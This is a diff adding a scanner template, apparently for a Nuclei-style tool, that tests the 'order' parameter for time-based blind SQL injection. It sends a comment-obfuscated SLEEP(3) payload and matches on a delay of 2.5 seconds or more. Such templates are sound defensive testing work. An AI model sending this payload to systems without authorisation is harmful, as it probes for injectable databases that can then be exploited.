@@ -1,0 +1,19 @@
+id: sqli-time3-507
+name: 'Delay probe in order'
+severity: high
+type: active
+tags:
+  - sqli
+  - injection
+  - blind
+  - time
+description: '3-second delay via order'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      order:
+        - '''/**/AND/**/SLEEP(3)--'
+    matchers:
+      - type: time
+        ms: 2500
